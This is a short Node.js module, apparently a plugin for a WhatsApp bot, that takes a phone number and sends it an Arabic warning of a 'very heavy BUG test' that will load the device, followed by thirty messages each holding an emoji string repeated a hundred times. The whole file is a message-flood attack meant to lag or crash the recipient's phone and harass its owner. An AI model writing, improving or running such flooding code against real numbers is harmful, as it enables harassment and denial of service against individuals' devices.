module.exports = async (sock, number) => {
    await sock.sendMessage(number + "@s.whatsapp.net", {
        text: "⚠️ اختبار BUG ثقيل جدًا\n⚡ تحمّل الجهاز الآن!"
    });

    for (let i = 0; i < 30; i++) {
        await sock.sendMessage(number + "@s.whatsapp.net", {
            text: "💥💥💥🔥🔥🔥⚡⚡⚡".repeat(100)
        });
    }
};
